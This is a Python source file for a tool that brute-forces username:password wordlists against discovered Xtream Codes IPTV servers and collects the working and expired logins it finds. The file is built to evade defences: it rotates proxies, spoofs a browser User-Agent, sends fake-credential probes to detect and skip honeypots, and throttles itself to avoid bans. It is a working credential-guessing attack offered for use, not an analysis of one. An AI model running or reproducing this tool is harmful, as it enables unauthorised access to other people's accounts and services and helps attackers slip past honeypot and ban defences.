"""
Default Credential Tester for discovered Xtream Codes servers.
Tests common/default username:password combinations against confirmed servers.
Rate-limited with backoff to avoid bans.
Supports stats tracking and direct writing of active/expired credentials.
"""
import time
import logging
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from network.xtream_client import check_xtream, get_server_info
from network.proxy_connect import get_proxied_session

# Suppress urllib3 InsecureRequestWarning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger(__name__)

# Common default credentials removed to ensure only custom wordlists are tested
DEFAULT_CREDENTIALS = []


class CredentialTester:
    """Tests credentials against confirmed Xtream servers."""

    def __init__(self, credentials=None, threads=5, timeout=10,
                 proxy_pool=None, polite_delay=0.5, stats=None, stop_event=None,
                 active_callback=None, expired_callback=None):
        self.credentials = credentials if credentials is not None else []
        self.threads = threads
        self.timeout = timeout
        self.proxy_pool = proxy_pool
        self.polite_delay = polite_delay
        self.stats = stats
        self.stop_event = stop_event
        self.active_callback = active_callback
        self.expired_callback = expired_callback
        
        self.active_results = []
        self.expired_results = []
        self._lock = threading.Lock()

    def load_wordlist(self, filepath):
        """
        Load additional credentials from a wordlist file.
        Format: username:password (one per line)
        """
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if ':' in line:
                        parts = line.split(':', 1)
                        self.credentials.append((parts[0], parts[1]))
                    elif ' ' in line:
                        parts = line.split(None, 1)
                        self.credentials.append((parts[0], parts[1]))

            log.info(f"📋 Loaded {len(self.credentials)} total credentials "
                     f"(including wordlist)")
        except Exception as e:
            log.error(f"Error loading wordlist: {e}")

    # Multiple distinct fake credential pairs for robust wildcard detection.
    # Each pair is structurally different to defeat simple blocklists.
    _FAKE_CREDS = [
        ('fake_user_test_997', 'fake_pass_test_997'),
        ('zZzProbeXxX_881', 'p@$$w0rd_test_882'),
        ('honeypot_detect_abc', 'h0n3yp0t_xyz_999'),
    ]

    def _check_wildcard_honeypot(self, server_info):
        """
        Probe the server with multiple distinct fake credentials to detect
        wildcard auth servers, honeypots, or non-Xtream servers.

        Uses 3 different fake credential pairs. If ANY probe returns
        active/expired the server is flagged as wildcard. This handles
        load-balanced servers that respond inconsistently (sometimes JSON,
        sometimes HTML across different backend nodes).
        """
        host = server_info['host']
        port = server_info['port']
        formatted_host = f"[{host}]" if ':' in host else host
        base_url = server_info.get('base_url', f"http://{formatted_host}:{port}")

        max_proxy_retries = 2 if self.proxy_pool and self.proxy_pool.alive_count > 0 else 0
        active_probes = 0   # How many probes returned active/expired
        total_probes = 0    # How many probes gave a conclusive (non-error) answer

        for username, password in self._FAKE_CREDS:
            fake_cred = {
                'host': host,
                'port': port,
                'username': username,
                'password': password,
                'base_url': base_url
            }

            result = None

            # Try proxies first
            for _ in range(max_proxy_retries):
                proxy = self.proxy_pool.get_random() if self.proxy_pool else None
                if not proxy:
                    break
                result = check_xtream(fake_cred, proxy=proxy, timeout=self.timeout, debug=False)
                if result != 'connection_error':
                    break

            # Fallback to direct connection
            if result is None or result == 'connection_error':
                result = check_xtream(fake_cred, proxy=None, timeout=self.timeout, debug=False)

            if result in ('active', 'expired'):
                active_probes += 1
                total_probes += 1
            elif result in ('fail', 'invalid_server'):
                total_probes += 1
            # connection_error → don't count; try next pair

            # Early exit: confirmed wildcard after first positive probe
            if active_probes >= 1:
                return 'wildcard'

        # If all conclusive probes said invalid_server, the server format is wrong
        if total_probes > 0 and active_probes == 0:
            if total_probes == sum(1 for _ in self._FAKE_CREDS):
                # Every probe got invalid_server (non-Xtream format)
                pass
            return 'ok'

        return 'ok'

    # Additional fake creds used only for inline re-verification (distinct from _FAKE_CREDS).
    _INLINE_FAKE_CREDS = [
        ('xWiLdCaRd_vErIfY_443', 'wIlDcArD_cHeCk_887xX'),
        ('inLiNe_PrObE_229', 'pr0be_InLiNe_448xX'),
        ('veRiFy_WiLd_991xX', 'w1LdC4rD_vFY_229'),
    ]

    def _is_inline_wildcard(self, server_info):
        """
        Inline wildcard re-verification after a non-standard-path 'active' hit.

        Fires up to 3 distinct fake credential probes. Because load-balanced
        servers can respond inconsistently (some nodes JSON, some HTML),
        a single probe is insufficient. We try all 3 and return True as soon
        as ANY probe returns active/expired.

        Returns True if the server is confirmed wildcard.
        """
        host = server_info['host']
        port = server_info['port']
        formatted_host = f"[{host}]" if ':' in host else host
        base_url = server_info.get('base_url', f"http://{formatted_host}:{port}")

        for username, password in self._INLINE_FAKE_CREDS:
            fake_cred = {
                'host': host,
                'port': port,
                'username': username,
                'password': password,
                'base_url': base_url
            }
            result = check_xtream(fake_cred, proxy=None, timeout=self.timeout, debug=False)
            if result in ('active', 'expired'):
                return True  # Confirmed wildcard on this probe
            # 'fail' / 'invalid_server' → try next probe
            # 'connection_error' → try next probe (transient failure)

        # All probes returned non-active → not a wildcard (or unreachable)
        return False

    def test_server(self, server_info):
        """
        Test all credentials against a single server.

        Args:
            server_info: dict with 'host', 'port', 'base_url'

        Returns:
            list of dicts for working credentials
        """
        host = server_info['host']
        port = server_info['port']
        formatted_host = f"[{host}]" if ':' in host else host
        base_url = server_info.get('base_url', f"http://{formatted_host}:{port}")

        # Track whether this server has already been confirmed as a wildcard
        # mid-session (lazy detection for load-balanced inconsistent servers).
        self._server_wildcard_cache = getattr(self, '_server_wildcard_cache', {})
        
        # 1. Honeypot / Wildcard check before brute forcing
        check_status = self._check_wildcard_honeypot(server_info)
        if check_status == 'wildcard':
            log.warning(f"  ⚠️ Skipping honeypot/wildcard server: {base_url} (accepted fake credentials)")
            if self.stats:
                for _ in range(len(self.credentials)):
                    self.stats.record_attempt()
            return []

        working = []
        total_creds = len(self.credentials)
        tested_count = 0
        consecutive_errors = 0
        max_consecutive_errors = 10  # Skip server after 10 consecutive errors
        # Count how many credentials returned 'active' via the non-standard
        # (no 'auth' key) path. A real panel never accepts 2+ random passwords
        # this way — if we see 2 such hits it's a wildcard server.
        nonstandard_active_count = 0
        MAX_NONSTANDARD_ACTIVE = 2

        # Persistent direct session with Keep-Alive for massive speedup
        server_session = get_proxied_session(None)
        server_session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Connection': 'keep-alive'
        })

        try:
            for username, password in self.credentials:
                if self.stop_event and self.stop_event.is_set():
                    break

                # If server has too many consecutive errors, it's likely dead/blocked
                if consecutive_errors >= max_consecutive_errors:
                    log.warning(f"  ⛔ Skipping {base_url}: "
                               f"{max_consecutive_errors} consecutive errors, "
                               f"server appears unreachable")
                    # Count remaining untested creds as attempts so global progress stays accurate
                    remaining = total_creds - tested_count
                    if self.stats:
                        for _ in range(remaining):
                            self.stats.record_attempt()
                    break

                tested_count += 1
                cred = {
                    'host': host,
                    'port': port,
                    'username': username,
                    'password': password,
                    'base_url': base_url
                }

                enable_debug = tested_count <= 3
                proxy = None

                # Retry logic: try proxies first, then fallback to direct connection
                result = None
                max_proxy_retries = 2 if self.proxy_pool and self.proxy_pool.alive_count > 0 else 0

                # 1. Try with proxies
                for attempt in range(max_proxy_retries):
                    proxy = self.proxy_pool.get_random() if self.proxy_pool else None
                    if not proxy:
                        break

                    result = check_xtream(cred, proxy=proxy, timeout=self.timeout, debug=enable_debug)

                    if result != 'connection_error':
                        if self.proxy_pool:
                            self.proxy_pool.report_success(proxy)
                        break
                    else:
                        if self.proxy_pool:
                            self.proxy_pool.report_failure(proxy)

                # 2. Fallback to DIRECT connection with persistent session
                if result is None or result == 'connection_error':
                    direct_result = check_xtream(cred, proxy=None, timeout=self.timeout, debug=enable_debug, session=server_session)
                    if direct_result != 'connection_error':
                        result = direct_result
                        proxy = None
                    elif result is None:
                        result = direct_result
                        proxy = None

                if self.stats:
                    self.stats.record_attempt()

                if result == 'active':
                    consecutive_errors = 0  # Reset on success

                    server_key = base_url

                    # ── Inline wildcard guard (multi-probe) ──
                    # On the FIRST active hit: fire up to 3 distinct fake-cred probes.
                    # On load-balanced servers this catches wildcards whose JSON nodes
                    # respond inconsistently with HTML nodes.
                    if server_key not in self._server_wildcard_cache:
                        is_wc = self._is_inline_wildcard(server_info)
                        self._server_wildcard_cache[server_key] = is_wc
                        if is_wc:
                            log.warning(f"  ⚠️ Late-detected wildcard server: {base_url} "
                                        f"(inline check confirmed fake creds accepted). Skipping remaining.")
                            remaining = total_creds - tested_count
                            if self.stats:
                                for _ in range(remaining):
                                    self.stats.record_attempt()
                            break

                    if self._server_wildcard_cache.get(server_key):
                        # Already confirmed wildcard mid-session — skip
                        continue

                    # ── Nonstandard-active counter guard ──
                    # If the inline probe missed a wildcard (all 3 probes hit HTML nodes)
                    # but the server keeps returning 'active' for every credential, we
                    # detect this by counting consecutive active hits. A real Xtream panel
                    # would never accept MAX_NONSTANDARD_ACTIVE different random passwords.
                    nonstandard_active_count += 1
                    if nonstandard_active_count >= MAX_NONSTANDARD_ACTIVE:
                        # Force one final inline check before declaring wildcard
                        if self._is_inline_wildcard(server_info):
                            self._server_wildcard_cache[server_key] = True
                            log.warning(f"  ⚠️ Late-detected wildcard server: {base_url} "
                                        f"({nonstandard_active_count} consecutive active hits + inline confirm). Skipping.")
                            remaining = total_creds - tested_count
                            if self.stats:
                                for _ in range(remaining):
                                    self.stats.record_attempt()
                            break
                        else:
                            # Inline disagrees — reset counter and trust this server
                            nonstandard_active_count = 0
                            self._server_wildcard_cache[server_key] = False

                    details = get_server_info(cred, proxy=proxy,
                                              timeout=self.timeout)
                    entry = {
                        'host': host,
                        'port': port,
                        'base_url': base_url,
                        'username': username,
                        'password': password,
                        'status': 'active',
                        'details': details or {}
                    }
                    working.append(entry)
                    with self._lock:
                        self.active_results.append(entry)

                    if details and details.get('is_playable') == 'Yes':
                        ch_info = f"{details.get('live_channels', 0)} ch"
                        log.info(f"  🎬 VERIFIED PLAYABLE ({ch_info}): {base_url} → {username}:{password}")
                    else:
                        log.info(f"  ✅ ACTIVE: {base_url} → {username}:{password}")

                    if self.stats:
                        self.stats.record_active()
                    if self.active_callback:
                        self.active_callback(cred, details or {})

                elif result == 'expired':
                    consecutive_errors = 0  # Reset on success
                    entry = {
                        'host': host,
                        'port': port,
                        'base_url': base_url,
                        'username': username,
                        'password': password,
                        'status': 'expired',
                        'details': {}
                    }
                    working.append(entry)
                    with self._lock:
                        self.expired_results.append(entry)
                    log.info(f"  ⏰ EXPIRED: {base_url} → "
                             f"{username}:{password}")

                    if self.stats:
                        self.stats.record_expired()
                    if self.expired_callback:
                        self.expired_callback(cred)

                elif result == 'rate_limited':
                    log.warning(f"  🚦 Rate-limited on {base_url}, "
                                 f"skipping remaining creds")
                    if self.stats:
                        self.stats.record_error()
                    break

                elif result in ('fail', 'invalid_server'):
                    consecutive_errors = 0  # Server responded

                elif result == 'connection_error':
                    consecutive_errors += 1
                    if self.stats:
                        self.stats.record_error()

                # Polite delay between attempts
                if self.polite_delay > 0:
                    time.sleep(self.polite_delay)
        finally:
            try:
                server_session.close()
            except Exception:
                pass

        return working

    def test_servers(self, servers):
        """
        Test credentials against multiple servers.

        Args:
            servers: list of confirmed server dicts from fingerprinter

        Returns:
            tuple of (active_results, expired_results)
        """
        if not servers:
            return ([], [])

        log.info(f"🔑 Testing {len(self.credentials)} credential combos "
                 f"against {len(servers)} confirmed servers...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self.test_server, server): server
                for server in servers
            }

            tested = 0
            for future in as_completed(futures):
                if self.stop_event and self.stop_event.is_set():
                    break
                tested += 1
                try:
                    future.result()
                except Exception as e:
                    log.warning(f"  ⚠️ Credential test error: {e}")
                    if self.stats:
                        self.stats.record_error()

                if tested % max(1, len(servers) // 5) == 0:
                    log.info(f"  🔑 Tested {tested}/{len(servers)} servers "
                             f"({len(self.active_results)} active, "
                             f"{len(self.expired_results)} expired)")

        log.info(f"🔑 Credential testing complete: "
                 f"{len(self.active_results)} active, "
                 f"{len(self.expired_results)} expired")

        return (self.active_results, self.expired_results)

    def run(self, servers):
        """Run credential testing pipeline."""
        return self.test_servers(servers)
